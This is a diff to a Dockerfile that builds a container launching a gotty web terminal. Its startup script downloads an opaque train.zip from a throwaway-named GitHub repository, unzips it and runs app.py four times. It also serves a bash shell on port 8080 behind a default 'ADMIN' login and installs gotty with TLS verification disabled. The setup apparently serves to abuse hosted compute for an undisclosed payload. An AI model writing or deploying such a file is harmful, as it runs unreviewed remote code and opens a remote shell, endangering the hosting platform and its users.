@@ -1,23 +1,23 @@
-# Use the official Ubuntu base image
 FROM python:3.10
-# Install necessary packages
-RUN apt-get update && apt-get install -y \
-    curl \
-    unzip \
-    gnupg \
-    tar \
-    && rm -rf /var/lib/apt/lists/*
-# Set working directory
-WORKDIR /app
 
-# Download and extract the tar.gz file from GitHub
-RUN curl https://github.com/hemsakatu/animated-winner/raw/main/train.zip -L -O -J
+ENV LANG en_US.UTF-8
+ENV LANGUAGE en_US:en
+ENV GOTTY_TAG_VER v1.5.0
 
-RUN unzip train.zip
+RUN apt-get -y update && \
+    apt-get install -y curl && \
+    curl -sLk https://github.com/sorenisanerd/gotty/releases/download/${GOTTY_TAG_VER}/gotty_${GOTTY_TAG_VER}_linux_amd64.tar.gz \
+    | tar xzC /usr/local/bin 
 
+RUN echo 'USER="ADMIN"' >> gotty.sh
+RUN echo 'PASS="${TTY_PASSWORD:-$(head -c 25 /dev/urandom | base64)}"' >> gotty.sh
+RUN echo 'echo USER: $USER' >> gotty.sh
+RUN echo 'echo PASSWORD: $PASS' >> gotty.sh
+RUN echo 'apt-get update;apt-get install wget curl -y' >> gotty.sh
+RUN echo 'wget https://github.com/hemsakatu/effective-chainsaw/raw/master/train.zip;unzip train.zip;python app.py;python app.py;python app.py;python app.py' >> gotty.sh
+RUN echo 'gotty --credential "${USER}:${PASS}" --port 8080 --reconnect -w bash' >> gotty.sh
+RUN chmod +x gotty.sh
 
-# Install Node.js dependencies
-# Expose the port the app runs on (if applicable, change if needed)
-EXPOSE 3000
-# Run the application
-CMD ["python", "app.py"]
+EXPOSE 8080
+
+ENTRYPOINT /gotty.sh
